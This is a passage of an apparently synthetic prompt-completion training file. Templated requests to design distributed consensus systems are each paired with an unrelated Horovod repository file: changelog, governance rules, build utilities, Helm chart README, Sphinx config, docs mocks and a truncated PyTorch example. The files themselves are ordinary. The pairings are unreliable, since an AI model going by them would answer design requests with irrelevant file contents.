([#2254](https://github.com/horovod/horovod/pull/2254))\n- Exposed name argument to TensorFlow allreduce operation. ([#2325](https://github.com/horovod/horovod/pull/2325))\n- Added option to strip outer name scope from Horovod ops in TensorFlow. ([#2328](https://github.com/horovod/horovod/pull/2328))\n\n### Fixed\n\n- Fixed usage of VERBOSE=1 when setting custom MAKEFLAGS. ([#2239](https://github.com/horovod/horovod/pull/2239))\n- Fixed bugs in Keras Elastic Callback classes. ([#2289](https://github.com/horovod/horovod/pull/2289))\n- Fixed RelWithDebInfo build and made it the default with -03 optimizations. ([#2305](https://github.com/horovod/horovod/pull/2305))\n- Fixed usage of tf.cond in TensorFlow alltoall gradient. ([#2327](https://github.com/horovod/horovod/pull/2327))\n- Fixed allreduce averaging for TF IndexedSlices in ROCm path. ([#2279](https://github.com/horovod/horovod/pull/2279))\n- Include stdexcept to handle certain compiler / frameworks that don't include it already. ([#2238](https://github.com/horovod/horovod/pull/2238))\n- Fixed Debug builds by setting compiler options based on CMake build type. ([#2263](https://github.com/horovod/horovod/pull/2263))\n- Skipped launching zero-sized send/recvs for NCCLAlltoall. ([#2273](https://github.com/horovod/horovod/pull/2273))\n- Fixed missing run in tf keras elastic mode. ([#2272](https://github.com/horovod/horovod/pull/2272))\n- Fixed loss function in TensorFlow2 elastic synthetic benchmark. ([#2265](https://github.com/horovod/horovod/pull/2265))\n- Fixed usage of HOROVOD_MIXED_INSTALL env var in alltoall tests. ([#2266](https://github.com/horovod/horovod/pull/2266))\n- Removed keras requirement from Ray example. ([#2262](https://github.com/horovod/horovod/pull/2262))\n\n## [0.20.0] - 2020-09-02\n\n### Added\n\n- Added bare-metal elastic mode implementation to enable auto-scaling and fault tolerance. ([#1849](https://github.com/horovod/horovod/pull/1849))\n- Added Elastic Horovod support for Spark auto-scaling. ([#1956](https://github.com/horovod/horovod/pull/1956))\n- Added All-to-All operation for TensorFlow, PyTorch, and MXNet. ([#2143](https://github.com/horovod/horovod/pull/2143))\n- Added support for `gradient_predivide_factor` and averaging in Horovod backend. ([#1949](https://github.com/horovod/horovod/pull/1949))\n- Added NCCL implementation of the allgather operation. ([#1952](https://github.com/horovod/horovod/pull/1952))\n- Added `HOROVOD_GPU_OPERATIONS` installation variable to simplify enabling NCCL support for all GPU operations. ([#1960](https://github.com/horovod/horovod/pull/1960))\n- Added TensorFlow implementation of `SyncBatchNormalization` layer. ([#2075](https://github.com/horovod/horovod/pull/2075))\n- Added `hvd.is_initialized()` method. ([#2020](https://github.com/horovod/horovod/pull/2020))\n- Added `hvd.allgather_object` function for TensorFlow, PyTorch, and MXNet. ([#2166](https://github.com/horovod/horovod/pull/2166))\n- Added `hvd.broadcast_object` function for MXNet. ([#2122](https://github.com/horovod/horovod/pull/2122))\n- Added `label_shapes` parameter to KerasEstimator and TorchEstimator. ([#2140](https://github.com/horovod/horovod/pull/2140))\n- Added optional `modelCheckPoint` callback to KerasEstimator params. ([#2124](https://github.com/horovod/horovod/pull/2124))\n- Added `ssh_identity_file` argument to `horovodrun`. ([#2201](https://github.com/horovod/horovod/pull/2201))\n- Added support for `horovodrun` on `kubeflow/mpi-job`. ([#2199](https://github.com/horovod/horovod/pull/2199))\n- Added Ray integration. ([#2218](https://github.com/horovod/horovod/pull/2218))\n\n### Changed\n\n- Moved `horovod.run.runner.run` to `horovod.run`. ([#2099](https://github.com/horovod/horovod/pull/2099))\n- HOROVOD_THREAD_AFFINITY accepts multiple values, one for every Horovod rank ([#2131](https://github.com/horovod/horovod/pull/2131))\n- Migrated build system for native libraries to CMake ([#2009](https://github.com/horovod/horovod/pull/2009))\n\n### Deprecated\n\n- HOROVOD_CCL_BGT_AFFINITY is deprected. Use HOROVOD_THREAD_AFFINITY instead ([#2131](https://github.com/horovod/horovod/pull/2131))\n\n### Removed\n\n- Dropped support for Python 2. ([#1954](https://github.com/horovod/horovod/pull/1954))\n- Dropped support for TensorFlow < 1.15. ([#2169](https://github.com/horovod/horovod/pull/2169))\n- Dropped support for PyTorch < 1.2. ([#2086](https://github.com/horovod/horovod/pull/2086))\n\n### Fixed\n\n- Fixed MXNet allgather implementation to correctly handle resizing the output buffer. ([#2092](https://github.com/horovod/horovod/pull/2092))\n- Fixed Keras Spark Estimator incompatibility with TensorFlow 1.15 due to `tf.autograph`. ([#2069](https://github.com/horovod/horovod/pull/2069))\n- Fixed API compatibility with PyTorch 1.6. ([#2051](https://github.com/horovod/horovod/pull/2051))\n- Fixed Keras API compatibility with TensorFlow 2.4.0. ([#2178](https://github.com/horovod/horovod/pull/2178))\n- Fixed allgather gradient for TensorFlow 2 in cases where the tensor shape is not known during graph construction. ([#2121](https://github.com/horovod/horovod/pull/2121))\n- Fixed running using Gloo with an imbalanced number of workers per host. ([#2212](https://github.com/horovod/horovod/pull/2212))\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "CHANGELOG.md", "language": "markdown", "complexity": "complex", "star_count": 14555, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 522}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "## Governance of the Horovod Project\n\nHorovod is a graduated projected within the [LF AI & Data Foundation](https://lfaidata.foundation/).\n\n### Charter\n\nYou can find Horovod Charter [here](https://wiki.lfai.foundation/download/attachments/7733301/Horovod%20Project%20Technical%20Charter%2012-22-2018%20FINAL.pdf?version=1&modificationDate=1558389484000&api=v2)\n\n### Technical Steering Committee\n\nHorovod development is governed by the Horovod Technical Steering Committee (TSC). The TSC consists of voting and\nnon-voting members, in addition to a chairman responsible for running TSC meetings, setting the meeting agenda, and\ncalling votes on proposals.\n\nCurrent chairman of the Horovod TSC:\n* [Travis Addair](https://github.com/tgaddair) - Predibase\n\nCurrent voting members of the Horovod TSC:\n* [Alex Sergeev](https://github.com/alsrgv) - Carbon Robotics\n* [Travis Addair](https://github.com/tgaddair) - Predibase\n* [Can Karakus](https://github.com/karakusc) - Amazon\n* [Josh Romero](https://github.com/romerojosh) - NVIDIA\n* [Nicolas Castet](https://github.com/nvcastet) - NVIDIA\n* [Enrico Minack](https://github.com/EnricoMi) - G-Research\n* [Xu Ning](https://github.com/thuningxu) - Snap Inc.\n* [Todd Mytkowicz](https://github.com/klipto) - Microsoft\n* [Max Gerlach](https://github.com/maxhgerlach) - DeepL\n\nCurrent non-voting members of the Horovod TSC:\n* [Leonard Lausen](https://github.com/leezu) - Amazon\n* [Jonathan Dekhtiar](https://github.com/DEKHTIARJonathan) - NVIDIA\n* [Richard Liaw](https://github.com/richardliaw) - Anyscale\n* [Neil Conway](https://github.com/neilconway) - Determined AI, HPE\n* [Min Cai](https://github.com/mincai) - Uber\n* [Chongxiao Cao](https://github.com/chongxiaoc) - Uber\n* [Ryan Beethe](https://github.com/rb-determined-ai) - Determined AI, HPE\n* [Abin Shahab](https://github.com/ashahab) - LinkedIn\n* [TJ Xu](https://github.com/Tixxx) - NVIDIA\n* [Keqiu Hu](https://github.com/oliverhu) - LinkedIn\n* [Peng Zhang](https://github.com/irasit) - Uber\n\nEmeritus members of the Horovod TSC:\n* [Lin Yuan](https://github.com/apeforest)\n* [Haibin Lin](https://github.com/eric-haibin-lin)\n* [Yuxi Hu](https://github.com/yuxihu)\n* [Emad Barsoum](https://github.com/ebarsoum)\n* [Aaron Harlap](https://github.com/aaron276h)\n* [Jaliya Ekanayake](https://github.com/jaliyae)\n* [Kaarthik Sivashanmugam](https://github.com/skaarthik)\n* [Armand McQueen](https://github.com/armandmcqueen)\n\nNon-voting members of the TSC (\"maintainers\") have commit access to the Horovod GitHub repository, and take part in the\nstanding TSC meetings and mailing lists. Emeritus members are no longer active maintainers of the project, but are\nwelcome to participate in any TSC meeting.\n\nThe Horovod TSC meets monthly and publishes meeting notes via a [mailing list](https://lists.lfai.foundation/g/horovod-tsc).\nThis mailing list can also be utilized to reach out to the TSC.  Major decisions regarding the technical directions of\nthe Horovod project will be brought before the TSC for discussion, with an accompanying proposal document termed an RFC\n(Request for Comments).\n\nTechnical decisions made by the TSC should be unanimous, with each voting and non-voting member either agreeing to the\nproposal or abstaining for it to pass.  If consensus cannot be reached, then the proposal is to be put to a vote\namong the voting members of the TSC, at which point a majority of the voting TSC must agree to the proposal for it to\npass.\n\nDecisions to add or change members of the TSC in either a voting or non-voting capacity are handled the same as other\nproposals (without an RFC): an attempt is made to reach a unanimous decision among the entire TSC, followed by a vote\namong the voting members if no consensus can be reached.\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "GOVERNANCE.md", "language": "markdown", "complexity": "simple", "star_count": 14555, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 69}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2018 Amazon.com, Inc. or its affiliates. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\nimport os\nimport subprocess\nimport sys\n\ndef is_mx_cuda():\n    try:\n        from mxnet import runtime\n        features = runtime.Features()\n        return features.is_enabled('CUDA')\n    except Exception:\n        if 'linux' in sys.platform:\n            try:\n                import mxnet as mx\n                mx_libs = mx.libinfo.find_lib_path()\n                for mx_lib in mx_libs:\n                    output = subprocess.check_output(['readelf', '-d', mx_lib])\n                    if 'cuda' in str(output):\n                        return True\n                return False\n            except Exception:\n                return False\n    return False\n\ndef is_mx_mkldnn():\n    return is_mx_dnn('MKLDNN')\n\ndef is_mx_onednn():\n    return is_mx_dnn('ONEDNN')\n\ndef is_mx_dnn(dnn_flavour: str):\n    \"\"\"\n    Detects if MXNet is build with given DNN flavour (MKLDNN or oneDNN) support.\n    MXNET ≥ 2.0.0 uses oneDNN (renamed from MKLDNN), < 2.0.0 MKLDNN.\n    \"\"\"\n    dnn_flavour_lower = dnn_flavour.lower()\n    dnn_flavour = dnn_flavour.upper()\n    try:\n        from mxnet import runtime\n        features = runtime.Features()\n        return features.is_enabled(dnn_flavour)\n    except Exception:\n        msg = f'INFO: Cannot detect if {dnn_flavour} is enabled in MXNet. Please ' \\\n              f'set MXNET_USE_{dnn_flavour}=1 if {dnn_flavour} is ' \\\n              f'enabled in your MXNet build.'\n        if 'linux' not in sys.platform:\n            # MKLDNN / oneDNN is only enabled by default in MXNet Linux build. Return\n            # False by default for non-linux build but still allow users to\n            # enable it by using MXNET_USE_MKLDNN / MXNET_USE_ONEDNN env variable.\n            print(msg, file=sys.stderr)\n            return os.environ.get(f'MXNET_USE_{dnn_flavour}', '0') == '1'\n        else:\n            try:\n                import mxnet as mx\n                mx_libs = mx.libinfo.find_lib_path()\n                for mx_lib in mx_libs:\n                    output = subprocess.check_output(['readelf', '-d', mx_lib])\n                    if dnn_flavour_lower in str(output):\n                        return True\n                return False\n            except Exception:\n                print(msg, file=sys.stderr)\n            return os.environ.get(f'MXNET_USE_{dnn_flavour}', '0') == '1'\n\ndef get_nvcc_bin():\n    cuda_home = os.environ.get('HOROVOD_CUDA_HOME', '/usr/local/cuda')\n    cuda_nvcc = os.path.join(cuda_home, 'bin', 'nvcc')\n\n    for nvcc_bin in ['nvcc', cuda_nvcc]:\n        try:\n            subprocess.check_output([nvcc_bin, '--version'])\n            return nvcc_bin\n        except Exception:\n            pass\n\n    raise RuntimeError('Cannot find `nvcc`. `nvcc` is required to build Horovod with GPU operations. '\n                       'Make sure it is added to your path or in $HOROVOD_CUDA_HOME/bin.')\n\ndef get_nvcc_flags():\n    default_flags = ['-O3', '-Xcompiler', '-fPIC']\n    cc_list_env = os.environ.get('HOROVOD_BUILD_CUDA_CC_LIST')\n\n    # Invoke nvcc and extract all supported compute capabilities for CUDA toolkit version\n    nvcc_bin = get_nvcc_bin()\n    full_cc_list = subprocess.check_output(f\"{nvcc_bin} --help | \"\n                                           f\"sed -n -e '/gpu-architecture <arch>/,/gpu-code <code>/ p' | \"\n                                           f\"sed -n -e '/Allowed values/,/gpu-code <code>/ p' | \"\n                                           f\"grep -i sm_ | \"\n                                           f\"grep -Eo 'sm_[0-9]+' | \"\n                                           f\"sed -e s/sm_//g | \"\n                                           f\"sort -g -u | \"\n                                           f\"tr '\\n' ' '\",\n                                           shell=True).strip().split()\n    full_cc_list = [int(i) for i in full_cc_list]\n\n    # Build native kernels for specified compute capabilities\n    cc_list = full_cc_list if cc_list_env is None else [int(x) for x in cc_list_env.split(',')]\n    cc_list = sorted(cc_list)\n    for cc in cc_list[:-1]:\n        default_flags += ['-gencode', 'arch=compute_{cc},code=sm_{cc}'.format(cc=cc)]\n    # Build PTX for maximum specified compute capability\n    default_flags += ['-gencode', 'arch=compute_{cc},code=\\\\\"sm_{cc},compute_{cc}\\\\\"'.format(cc=cc_list[-1])]\n\n    return default_flags\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "cmake/build_utils.py", "language": "python", "complexity": "medium", "star_count": 14555, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 119}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Horovod Helm Chart\n\n## Introduction\n\nThis chart bootstraps Horovod which is a Distributed TensorFlow Framework on a Kubernetes cluster using the Helm Package Manager. It deploys Horovod workers as statefulsets, and the Horovod driver as a job, then discover the host list automatically.\n\n## Prerequisites\n\n- Kubernetes cluster v1.8+\n\n## Build Docker Image\n\nYou can download [official Horovod Dockerfile](https://github.com/horovod/horovod/blob/master/docker/horovod/Dockerfile), then modify it according to your requirement, e.g. select a different CUDA, TensorFlow or Python version.\n\n```\n# mkdir horovod-docker\n# wget -O horovod-docker/Dockerfile https://raw.githubusercontent.com/horovod/horovod/master/docker/horovod/Dockerfile\n# docker build -t horovod:latest horovod-docker\n```\n\n## Prepare ssh keys\n\n```\n# Setup ssh key\nexport SSH_KEY_DIR=`mktemp -d`\ncd $SSH_KEY_DIR\nyes | ssh-keygen -N \"\" -f id_rsa\n```\n\n## Create the values.yaml\n\nTo run Horovod with GPU, you can create `values.yaml` like below\n\n```\n# cat << EOF > ~/values.yaml\n---\nssh:\n  useSecrets: true\n  hostKey: |-\n$(cat $SSH_KEY_DIR/id_rsa | sed 's/^/    /g')\n\n  hostKeyPub: |-\n$(cat $SSH_KEY_DIR/id_rsa.pub | sed 's/^/    /g')\n\nresources:\n  limits:\n    nvidia.com/gpu: 1\n  requests:\n    nvidia.com/gpu: 1\n\nworker:\n  number: 2\n  image:\n    repository: horovod/horovod\n    tag: 0.24.3\ndriver:\n  image:\n    repository: horovod/horovod\n    tag: 0.24.3\n  args:\n    - \"mpirun -np 3 --hostfile /horovod/generated/hostfile --mca orte_keep_fqdn_hostnames t --allow-run-as-root --display-map --tag-output --timestamp-output sh -c 'python /examples/tensorflow_mnist.py'\"\nEOF\n```\n\nFor most cases, the overlay network impacts the Horovod performance greatly, so we should apply `Host Network` solution. To run Horovod with Host Network and GPU, you can create `values.yaml` like below\n\n\n```\n# cat << EOF > ~/values.yaml\n---\n+useHostNetwork: true\n\nssh:\n  useSecrets: true\n  port: 32222\n  hostKey: |-\n$(cat $SSH_KEY_DIR/id_rsa | sed 's/^/    /g')\n\n  hostKeyPub: |-\n$(cat $SSH_KEY_DIR/id_rsa.pub | sed 's/^/    /g')\n\nresources:\n  limits:\n    nvidia.com/gpu: 1\n  requests:\n    nvidia.com/gpu: 1\n\nworker:\n  number: 2\n  image:\n    repository: horovod/horovod\n    tag: 0.24.3\ndriver:\n  image:\n    repository: horovod/horovod\n    tag: 0.24.3\n  args:\n    - \"mpirun -np 3 --hostfile /horovod/generated/hostfile --mca orte_keep_fqdn_hostnames t --allow-run-as-root --display-map --tag-output --timestamp-output sh -c 'python /examples/tensorflow_mnist.py'\"\nEOF\n```\n\n> notice: the difference is that you should set `useHostNetwork` as true, then set another ssh port rather than `22`\n\n## Installing the Chart\n\nTo install the chart with the release name `mnist`:\n\n```bash\n$ helm install --values ~/values.yaml mnist stable/horovod\n```\n\n## Uninstalling the Chart\n\nTo uninstall/delete the `mnist` deployment:\n\n```bash\n$ helm delete mnist\n```\n\nThe command removes all the Kubernetes components associated with the chart and\ndeletes the release.\n\n## Upgrading an existing Release to a new major version\nA major chart version change (like v1.2.3 -> v2.0.0) indicates that there is an\nincompatible breaking change needing manual actions.\n\n### 1.0.0\nThis version removes the `chart` label from the `spec.selector.matchLabels`\nwhich is immutable since `StatefulSet apps/v1beta2`. It has been inadvertently\nadded, causing any subsequent upgrade to fail. See https://github.com/helm/charts/issues/7726.\n\nIn order to upgrade, delete the Horovod StatefulSet before upgrading, supposing your Release is named `my-release`:\n\n```bash\n$ kubectl delete statefulsets.apps --cascade=false my-release\n```\n\n## Configuration\n\nThe following table lists the configurable parameters of the Horovod\nchart and their default values.\n\n| Parameter | Description | Default |\n|-----------|-------------|---------|\n| `useHostNetwork`  | Host network    | `false` |\n| `ssh.port` | The ssh port | `22` |\n| `ssh.useSecrets` | Determine if using the secrets for ssh | `false` |\n| `worker.number`|  The worker's number | `5` |\n| `worker.image.repository` | horovod worker image | `horovod/horovod` |\n| `worker.image.pullPolicy` | `pullPolicy` for the worker | `IfNotPresent` |\n| `worker.image.tag` | `tag` for the worker | `0.24.3` |\n| `resources`| pod resource requests & limits| `{}`|\n| `worker.env` | worker's environment variables | `{}` |\n| `driver.image.repository` | horovod driver image | `horovod/horovod` |\n| `driver.image.tag` | `tag` for the driver | `0.24.3` |\n| `driver.image.pullPolicy` | image pullPolicy for the driver image| `IfNotPresent` |\n| `driver.args` | driver's args | `{}` |\n| `driver.env` | driver's environment variables | `{}` |\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "docker/helm/README.md", "language": "markdown", "complexity": "medium", "star_count": 14555, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 159}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Configuration file for the Sphinx documentation builder.\n#\n# This file only contains a selection of the most common options. For a full\n# list see the documentation:\n# http://www.sphinx-doc.org/en/master/config\n\n# -- Path setup --------------------------------------------------------------\n\n# If extensions (or modules to document with autodoc) are in another directory,\n# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\n#\nimport os\nimport sys\nsys.path.insert(0, os.path.abspath('.'))\nsys.path.insert(0, os.path.abspath('..'))\n\n\n# -- Project information -----------------------------------------------------\n\nproject = 'Horovod'\ncopyright = '2019, The Horovod Authors'\nauthor = 'The Horovod Authors'\n\nfrom horovod import __version__\nversion = __version__\n\n\n# -- Mocking configuration ---------------------------------------------------\n\nimport mocks\nmocks.instrument()\n\n\n# -- General configuration ---------------------------------------------------\n\n# Add any Sphinx extension module names here, as strings. They can be\n# extensions coming with Sphinx (named 'sphinx.ext.*') or your custom\n# ones.\nextensions = [\n    'sphinx.ext.autodoc',\n    'sphinx.ext.viewcode',\n    'sphinxcontrib.napoleon',\n    'nbsphinx',\n]\n\n# Add any paths that contain templates here, relative to this directory.\ntemplates_path = ['_templates']\n\n# The master toctree document.\nmaster_doc = 'index'\n\n# List of patterns, relative to source directory, that match files and\n# directories to ignore when looking for source files.\n# This pattern also affects html_static_path and html_extra_path.\nexclude_patterns = ['_build', 'Thumbs.db', '.DS_Store']\n\n\n# -- Autodoc configuration ---------------------------------------------------\n\nautodoc_default_options = {\n    'members': None,\n    'member-order': 'bysource',\n    'imported-members': None,\n    'exclude-members': 'contextmanager, version, tf, keras, torch, mx, pyspark',\n}\n\n\n# -- Options for HTML output -------------------------------------------------\n\n# The theme to use for HTML and HTML Help pages.  See the documentation for\n# a list of builtin themes.\n#\nhtml_theme = 'alabaster'\n\n# Theme options are theme-specific and customize the look and feel of a theme\n# further.  For a list of options available for each theme, see the\n# documentation.\n#\n# For alabaster: https://alabaster.readthedocs.io/en/latest/customization.html\n#\nhtml_theme_options = {\n    'logo': 'logo.png',\n    'description': 'Distributed training framework for TensorFlow, Keras, PyTorch, and Apache MXNet.',\n    'github_user': 'horovod',\n    'github_repo': 'horovod',\n    'github_button': True,\n    'github_type': 'star',\n    'github_count': 'true',\n    'fixed_sidebar': False,\n    'sidebar_collapse': True,\n    'font_family': 'Helvetica Neue'\n}\n\n# Add any paths that contain custom static files (such as style sheets) here,\n# relative to this directory. They are copied after the builtin static files,\n# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = ['_static']\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "docs/conf.py", "language": "python", "complexity": "simple", "star_count": 14555, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 99}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2019 Uber Technologies, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\nimport sys\nfrom unittest.mock import MagicMock\n\n\nclass Empty(object):\n    pass\n\n\nclass HasOutputCols(object):\n    pass\n\n\nclass Params(object):\n    @staticmethod\n    def _dummy():\n        return MagicMock()\n\n\nMOCK_MODULES = [\n    'cloudpickle',\n    'ctypes',\n    'h5py',\n    'psutil',\n\n    'fsspec',\n    'fsspec.callbacks',\n    'fsspec.core',\n    'fsspec.utils',\n\n    'pyarrow',\n    'pyarrow.parquet',\n\n    'numpy',\n    'numpy.core.multiarray',\n    'numpy.dtype',\n\n    'pyspark',\n    'pyspark.ml',\n    'pyspark.ml.linalg',\n    'pyspark.ml.param',\n    'pyspark.ml.param.shared',\n    'pyspark.ml.util',\n    'pyspark.sql',\n    'pyspark.sql.functions',\n    'pyspark.sql.types',\n\n    'ray',\n    'ray.exceptions',\n    'ray.services',\n    'ray.util',\n    'ray.util.placement_group',\n\n    'tensorflow',\n    'tensorflow.python',\n    'tensorflow.python.framework',\n    'tensorflow.python.platform',\n    'tensorflow.python.eager',\n    'tensorflow.python.keras',\n\n    'keras',\n    'keras.backend',\n\n    'torch',\n    'torch.autograd.function',\n    'torch.nn.functional',\n    'torch.nn.modules.batchnorm',\n    'torch.utils',\n    'torch.utils.data',\n    'torch.utils.data.distributed',\n    'torch.utils.tensorboard',\n    'torch.distributed',\n\n    'pytorch_lightning',\n    'pytorch_lightning.callbacks',\n    'pytorch_lightning.loggers',\n    'pytorch_lightning.utilities',\n    'pytorch_lightning.utilities.model_helpers',\n\n    'mxnet',\n    'mxnet.base',\n\n    'horovod.common.util',\n    'horovod.torch.mpi_lib_v2',\n]\n\n\nMOCK_TREE = {\n    'tensorflow': {\n        '__version__': '1.14.0',\n        'train': {\n            'Optimizer': MagicMock,\n            'SessionRunHook': MagicMock,\n        },\n        'estimator': {\n            'SessionRunHook': MagicMock,\n        },\n        'keras': {\n            'callbacks': {\n                'Callback': MagicMock,\n            },\n        },\n    },\n    'keras': {\n        'callbacks': {\n            'Callback': MagicMock,\n        },\n    },\n    'torch': {\n        '__version__': '1.0.0',\n        'nn': {\n            'modules': {\n                'batchnorm': {\n                    '_BatchNorm': MagicMock,\n                }\n            },\n        },\n        'utils': {\n            'data': {\n                'Sampler': MagicMock,\n            },\n        },\n    },\n    'pyspark': {\n        'ml': {\n            'Estimator': Empty,\n            'Model': Empty,\n            'param': {\n                'shared': {\n                    'HasOutputCols': HasOutputCols,\n                    'Param': MagicMock,\n                    'Params': Params,\n                    'TypeConverters': MagicMock(),\n                },\n            },\n            'util': {\n                'MLReadable': Empty,\n                'MLWritable': Empty,\n            }\n        },\n    },\n    'horovod': {\n        'common': {\n            'util': {\n                'get_ext_suffix': lambda: 'xyz',\n            },\n        },\n        'spark': {\n            'keras': {\n                'estimator': {\n                    'KerasEstimatorParamsReadable': MagicMock,\n                    'KerasEstimatorParamsWritable': MagicMock,\n                },\n            },\n            'torch': {\n                'estimator': {\n                    'TorchEstimatorParamsReadable': MagicMock,\n                    'TorchEstimatorParamsWritable': MagicMock,\n                },\n            },\n        },\n    },\n}\n\n\ndef gen_mock_package(path):\n    if type(path) == str:\n        path = path.split('.')\n\n    class TreeMock(MagicMock):\n        @classmethod\n        def __getattr__(cls, name):\n            full_path = path + [name]\n            tree_ptr = MOCK_TREE\n            for path_part in full_path:\n                if path_part in tree_ptr:\n                    if type(tree_ptr[path_part]) != dict:\n                        return tree_ptr[path_part]\n                    else:\n                        tree_ptr = tree_ptr[path_part]\n                else:\n                    return MagicMock()\n            return gen_mock_package(full_path)\n\n    return TreeMock()\n\n\ndef instrument():\n    sys.modules.update((mod_name, gen_mock_package(mod_name))\n                       for mod_name in MOCK_MODULES)\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "docs/mocks.py", "language": "python", "complexity": "complex", "star_count": 14555, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 205}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import torch\nimport argparse\nimport torch.backends.cudnn as cudnn\nimport torch.multiprocessing as mp\nimport torch.nn.functional as F\nimport torch.optim as optim\nimport torch.utils.data.distributed\nfrom torch.utils.tensorboard import SummaryWriter\nfrom torchvision import datasets, transforms, models\nimport horovod.torch as hvd\nimport os\nimport math\nfrom tqdm import tqdm\n\n# Training settings\nparser = argparse.ArgumentParser(description='Elastic PyTorch ImageNet Example',\n                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)\nparser.add_argument('--train-dir', default=os.path.expanduser('~/imagenet/train'),\n                    help='path to training data')\nparser.add_argument('--val-dir', default=os.path.expanduser('~/imagenet/validation'),\n                    help='path to validation data')\nparser.add_argument('--log-dir', default='./logs',\n                    help='tensorboard log directory')\nparser.add_argument('--checkpoint-format', default='./checkpoint-{epoch}.pth.tar',\n                    help='checkpoint file format')\n\n# Horoovd settings\nparser.add_argument('--fp16-allreduce', action='store_true', default=False,\n                    help='use fp16 compression during allreduce')\nparser.add_argument('--batches-per-allreduce', type=int, default=1,\n                    help='number of batches processed locally before '\n                         'executing allreduce across workers; it multiplies '\n                         'total batch size.')\nparser.add_argument('--use-adasum', action='store_true', default=False,\n                    help='use adasum algorithm to do reduction')\nparser.add_argument('--gradient-predivide-factor', type=float, default=1.0,\n                    help='apply gradient predivide factor in optimizer (default: 1.0)')\n\n# Elastic Horovod settings\nparser.add_argument('--batches-per-commit', type=int, default=100,\n                    help='number of batches processed before calling `state.commit()`; '\n                         'commits prevent losing progress if an error occurs, but slow '\n                         'down training.')\nparser.add_argument('--batches-per-host-check', type=int, default=10,\n                    help='number of batches processed before calling 